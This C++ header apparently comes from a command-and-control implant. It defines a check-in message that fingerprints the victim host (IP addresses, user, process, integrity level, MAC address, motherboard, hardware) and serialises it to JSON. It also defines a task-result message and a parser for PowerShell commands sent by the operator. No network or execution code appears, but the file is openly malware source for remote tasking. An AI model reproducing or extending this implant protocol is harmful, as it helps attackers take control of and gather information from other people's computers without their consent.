#pragma once
#include <string>
#include <iostream>
#include <string_view>
#include "rapidjson/stringbuffer.h"
#include "rapidjson/document.h"
#include "rapidjson/writer.h"

constexpr unsigned int string_hash(std::string_view str)
{
	unsigned int hash = 5381;
	for (char c : str) {
		hash = ((hash << 5) + hash) + c;
	}
	return hash;
}

struct IntitalCheckinRequest
{
	std::string internalIP;
	std::string externalIP;
	std::string OS;
	std::string user;
	std::string processName;
	int PID;
	std::string integrity;
	std::string macAddress;
	std::string motherboard;
	int RAM;
	double diskSize;
	double FreeDisk;
	int CPUCount;

	std::string StructToJson() const 
	{
		rapidjson::Document doc;
		doc.SetObject();

		rapidjson::Document::AllocatorType& allocator = doc.GetAllocator();

		doc.AddMember("internalIP", rapidjson::Value(internalIP.c_str(), allocator), allocator);
		doc.AddMember("externalIP", rapidjson::Value(externalIP.c_str(), allocator), allocator);
		doc.AddMember("OS", rapidjson::Value(OS.c_str(), allocator), allocator);
		doc.AddMember("user", rapidjson::Value(user.c_str(), allocator), allocator);
		doc.AddMember("processName", rapidjson::Value(processName.c_str(), allocator), allocator);
		doc.AddMember("Integrity", rapidjson::Value(integrity.c_str(), allocator), allocator);
		doc.AddMember("macAddress", rapidjson::Value(macAddress.c_str(), allocator), allocator);
		doc.AddMember("motherboard", rapidjson::Value(motherboard.c_str(), allocator), allocator);

		doc.AddMember("PID", PID, allocator);
		doc.AddMember("RAM", RAM, allocator);
		doc.AddMember("DiskSize", diskSize, allocator);
		doc.AddMember("FreeDisk", FreeDisk, allocator);
		doc.AddMember("CPUCount", CPUCount, allocator);

		rapidjson::StringBuffer buffer;
		rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
		doc.Accept(writer);
		return buffer.GetString();

	}
};

struct FullCheckinRequest
{
	int taskID;
	std::string status;
	std::string output;
};

struct ResultRequest
{
	int taskID;
	std::string status;
	std::string output;

	std::string StructToJson() const
	{
		rapidjson::Document doc;
		doc.SetObject();

		rapidjson::Document::AllocatorType& allocator = doc.GetAllocator();

		
		doc.AddMember("taskID", taskID, allocator);
		doc.AddMember("status", rapidjson::Value(status.c_str(), allocator), allocator);
		doc.AddMember("output", rapidjson::Value(output.c_str(), allocator), allocator);

		rapidjson::StringBuffer buffer;
		rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
		doc.Accept(writer);
		return buffer.GetString();

	}
};

struct PowershellCommand
{
	std::string commandlet;
	std::string arguements;
};


struct CheckinResponse
{
	int id;
	int type;
	std::string timestamp;
	PowershellCommand powerShellCommand;
};

CheckinResponse ParseCommand(const std::string& rawJson)
{
	CheckinResponse response;
	std::string typeVal;
	rapidjson::Document doc;

	if (doc.Parse(rawJson.c_str()).HasParseError() || !doc.IsObject())
	{
		std::cerr << "[x] Error: Failed to parse raw JSON string...\n";
		return response;
	}

	if (doc.HasMember("commandType") && doc["commandType"].IsInt())
	{
		response.type = doc["commandType"].GetInt();
	}
	else
	{
		std::cerr << "[x] Error: Type node is missing...\n";
		return response;
	}

	if (doc.HasMember("ID") && doc["ID"].IsInt()) response.id = doc["ID"].GetInt();
	if (doc.HasMember("timestamp") && doc["timestamp"].IsString()) response.timestamp = doc["timestamp"].GetString();

	if (doc.HasMember("command") && doc["command"].IsObject())
	{
		const rapidjson::Value& node = doc["command"];

		switch (response.type)
		{
		case 1:
			if (node.HasMember("Commandlet") && node["Commandlet"].IsString()) response.powerShellCommand.commandlet = node["Commandlet"].GetString();
			if (node.HasMember("Arguements") && node["Arguements"].IsString()) response.powerShellCommand.arguements = node["Arguements"].GetString();
			break;
		}
	}

	return response;
}